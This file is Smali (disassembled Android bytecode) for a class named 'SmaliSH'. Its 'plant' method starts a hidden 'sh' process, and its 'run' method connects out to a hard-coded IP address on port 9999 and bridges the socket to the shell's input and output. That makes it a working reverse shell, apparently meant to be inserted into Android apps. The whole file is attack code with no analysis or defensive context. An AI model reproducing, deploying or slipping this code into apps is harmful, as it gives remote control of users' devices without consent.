.class public Lre/SmaliSH;
.super Ljava/lang/Object;
.source "SmaliSH.java"

# interfaces
.implements Ljava/lang/Runnable;


# static fields
.field public static final AGGRESSIVE:Z = false

.field public static final TAG:Ljava/lang/String; = "re.SmaliSH"

.field public static final TARGET:Ljava/lang/String; = "185.227.110.50"

.field public static final TARGET_PORT:I = 0x270f

.field public static final VERBOSE:Z = true


# instance fields
.field final from:Ljava/io/InputStream;

.field final p:Ljava/lang/Process;

.field final to:Ljava/io/OutputStream;


# direct methods
.method public constructor <init>(Ljava/lang/Process;Ljava/io/InputStream;Ljava/io/OutputStream;)V
    .locals 0
    .param p1, "p"    # Ljava/lang/Process;
    .param p2, "from"    # Ljava/io/InputStream;
    .param p3, "to"    # Ljava/io/OutputStream;

    .line 25
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 26
    iput-object p1, p0, Lre/SmaliSH;->p:Ljava/lang/Process;

    .line 27
    iput-object p2, p0, Lre/SmaliSH;->from:Ljava/io/InputStream;

    .line 28
    iput-object p3, p0, Lre/SmaliSH;->to:Ljava/io/OutputStream;

    .line 29
    return-void
.end method

.method public static plant()V
    .locals 5

    .line 33
    new-instance v0, Ljava/lang/ProcessBuilder;

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/String;

    const-string v2, "sh"

    const/4 v3, 0x0

    aput-object v2, v1, v3

    invoke-direct {v0, v1}, Ljava/lang/ProcessBuilder;-><init>([Ljava/lang/String;)V

    .line 34
    .local v0, "proc":Ljava/lang/ProcessBuilder;
    const/4 v1, 0x0

    move-object v2, v1

    .line 36
    .local v2, "task":Lre/SmaliSH;
    :try_start_0
    new-instance v3, Lre/SmaliSH;

    invoke-virtual {v0}, Ljava/lang/ProcessBuilder;->start()Ljava/lang/Process;

    move-result-object v4

    invoke-direct {v3, v4, v1, v1}, Lre/SmaliSH;-><init>(Ljava/lang/Process;Ljava/io/InputStream;Ljava/io/OutputStream;)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    move-object v2, v3

    .line 40
    goto :goto_0

    .line 37
    :catch_0
    move-exception v1

    .line 38
    .local v1, "e":Ljava/io/IOException;
    const-string v3, "re.SmaliSH"

    const-string v4, "e"

    invoke-static {v3, v4, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 41
    .end local v1    # "e":Ljava/io/IOException;
    :goto_0
    new-instance v1, Ljava/lang/Thread;

    const-string v3, "ReSmaliSH.proc"

    invoke-direct {v1, v2, v3}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/lang/Thread;->start()V

    .line 42
    return-void
.end method


# virtual methods
.method public run()V
    .locals 6

    .line 46
    iget-object v0, p0, Lre/SmaliSH;->from:Ljava/io/InputStream;

    if-nez v0, :cond_0

    iget-object v0, p0, Lre/SmaliSH;->to:Ljava/io/OutputStream;

    if-nez v0, :cond_0

    .line 48
    const/4 v0, 0x0

    .line 50
    .local v0, "socket":Ljava/net/Socket;
    :try_start_0
    new-instance v1, Ljava/net/Socket;

    const-string v2, "185.227.110.50"

    const/16 v3, 0x270f

    invoke-direct {v1, v2, v3}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V

    move-object v0, v1

    .line 51
    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Ljava/net/Socket;->setKeepAlive(Z)V

    .line 52
    invoke-virtual {v0}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v1

    const-string v2, "re.SmaliSH $ "

    invoke-virtual {v2}, Ljava/lang/String;->getBytes()[B

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/io/OutputStream;->write([B)V

    .line 53
    new-instance v1, Lre/SmaliSH;

    iget-object v2, p0, Lre/SmaliSH;->p:Ljava/lang/Process;

    invoke-virtual {v0}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object v3

    iget-object v4, p0, Lre/SmaliSH;->p:Ljava/lang/Process;

    invoke-virtual {v4}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v4

    invoke-direct {v1, v2, v3, v4}, Lre/SmaliSH;-><init>(Ljava/lang/Process;Ljava/io/InputStream;Ljava/io/OutputStream;)V

    .line 54
    .local v1, "taskIn":Lre/SmaliSH;
    new-instance v2, Lre/SmaliSH;

    iget-object v3, p0, Lre/SmaliSH;->p:Ljava/lang/Process;

    iget-object v4, p0, Lre/SmaliSH;->p:Ljava/lang/Process;

    invoke-virtual {v4}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;

    move-result-object v4

    invoke-virtual {v0}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v5

    invoke-direct {v2, v3, v4, v5}, Lre/SmaliSH;-><init>(Ljava/lang/Process;Ljava/io/InputStream;Ljava/io/OutputStream;)V

    .line 55
    .local v2, "taskOut":Lre/SmaliSH;
    new-instance v3, Ljava/lang/Thread;

    const-string v4, "ReSmaliSH.task.in"

    invoke-direct {v3, v1, v4}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    invoke-virtual {v3}, Ljava/lang/Thread;->start()V

    .line 56
    new-instance v3, Ljava/lang/Thread;

    const-string v4, "ReSmaliSH.task.out"

    invoke-direct {v3, v2, v4}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    invoke-virtual {v3}, Ljava/lang/Thread;->start()V

    .line 57
    iget-object v3, p0, Lre/SmaliSH;->p:Ljava/lang/Process;

    invoke-virtual {v3}, Ljava/lang/Process;->waitFor()I
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    .end local v1    # "taskIn":Lre/SmaliSH;
    .end local v2    # "taskOut":Lre/SmaliSH;
    goto :goto_0

    .line 61
    :catch_0
    move-exception v1

    .line 62
    .local v1, "e":Ljava/lang/InterruptedException;
    const-string v2, "re.SmaliSH"

    const-string v3, "e"

    invoke-static {v2, v3, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    goto :goto_1

    .line 58
    .end local v1    # "e":Ljava/lang/InterruptedException;
    :catch_1
    move-exception v1

    .line 59
    .local v1, "e":Ljava/io/IOException;
    const-string v2, "re.SmaliSH"

    const-string v3, "e"

    invoke-static {v2, v3, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 64
    .end local v0    # "socket":Ljava/net/Socket;
    .end local v1    # "e":Ljava/io/IOException;
    :goto_0
    nop

    .line 65
    :goto_1
    goto :goto_6

    .line 66
    :cond_0
    const/16 v0, 0x2000

    new-array v0, v0, [B

    .line 69
    .local v0, "buf":[B
    :goto_2
    :try_start_1
    iget-object v1, p0, Lre/SmaliSH;->from:Ljava/io/InputStream;

    invoke-virtual {v1, v0}, Ljava/io/InputStream;->read([B)I

    move-result v1

    .line 70
    .local v1, "r":I
    const/4 v2, -0x1

    if-ne v1, v2, :cond_1

    .line 71
    const-string v2, "re.SmaliSH"

    const-string v3, "quit"

    invoke-static {v2, v3}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 72
    iget-object v2, p0, Lre/SmaliSH;->p:Ljava/lang/Process;

    invoke-virtual {v2}, Ljava/lang/Process;->destroy()V
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_3
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 73
    nop

    .line 83
    .end local v1    # "r":I
    :try_start_2
    iget-object v1, p0, Lre/SmaliSH;->from:Ljava/io/InputStream;

    invoke-virtual {v1}, Ljava/io/InputStream;->close()V
    :try_end_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_2

    .line 85
    goto :goto_3

    .line 84
    :catch_2
    move-exception v1

    .line 87
    :goto_3
    :try_start_3
    iget-object v1, p0, Lre/SmaliSH;->to:Ljava/io/OutputStream;

    invoke-virtual {v1}, Ljava/io/OutputStream;->close()V
    :try_end_3
    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_3} :catch_5

    goto :goto_5

    .line 75
    .restart local v1    # "r":I
    :cond_1
    :try_start_4
    iget-object v2, p0, Lre/SmaliSH;->to:Ljava/io/OutputStream;

    const/4 v3, 0x0

    invoke-virtual {v2, v0, v3, v1}, Ljava/io/OutputStream;->write([BII)V

    .line 76
    iget-object v2, p0, Lre/SmaliSH;->to:Ljava/io/OutputStream;

    invoke-virtual {v2}, Ljava/io/OutputStream;->flush()V
    :try_end_4
    .catch Ljava/io/IOException; {:try_start_4 .. :try_end_4} :catch_3
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    .line 77
    .end local v1    # "r":I
    goto :goto_2

    .line 82
    :catchall_0
    move-exception v1

    goto :goto_7

    .line 78
    :catch_3
    move-exception v1

    .line 79
    .local v1, "e":Ljava/io/IOException;
    :try_start_5
    const-string v2, "re.SmaliSH"

    const-string v3, "e"

    invoke-static {v2, v3, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    .line 83
    .end local v1    # "e":Ljava/io/IOException;
    :try_start_6
    iget-object v1, p0, Lre/SmaliSH;->from:Ljava/io/InputStream;

    invoke-virtual {v1}, Ljava/io/InputStream;->close()V
    :try_end_6
    .catch Ljava/io/IOException; {:try_start_6 .. :try_end_6} :catch_4

    .line 85
    goto :goto_4

    .line 84
    :catch_4
    move-exception v1

    .line 87
    :goto_4
    :try_start_7
    iget-object v1, p0, Lre/SmaliSH;->to:Ljava/io/OutputStream;

    invoke-virtual {v1}, Ljava/io/OutputStream;->close()V
    :try_end_7
    .catch Ljava/io/IOException; {:try_start_7 .. :try_end_7} :catch_5

    .line 90
    :goto_5
    goto :goto_6

    .line 88
    :catch_5
    move-exception v1

    .line 91
    nop

    .line 95
    .end local v0    # "buf":[B
    :goto_6
    return-void

    .line 82
    .restart local v0    # "buf":[B
    :goto_7
    nop

    .line 83
    :try_start_8
    iget-object v2, p0, Lre/SmaliSH;->from:Ljava/io/InputStream;

    invoke-virtual {v2}, Ljava/io/InputStream;->close()V
    :try_end_8
    .catch Ljava/io/IOException; {:try_start_8 .. :try_end_8} :catch_6

    .line 85
    goto :goto_8

    .line 84
    :catch_6
    move-exception v2

    .line 87
    :goto_8
    :try_start_9
    iget-object v2, p0, Lre/SmaliSH;->to:Ljava/io/OutputStream;

    invoke-virtual {v2}, Ljava/io/OutputStream;->close()V
    :try_end_9
    .catch Ljava/io/IOException; {:try_start_9 .. :try_end_9} :catch_7

    .line 90
    goto :goto_9

    .line 88
    :catch_7
    move-exception v2

    .line 91
    :goto_9
    throw v1
.end method
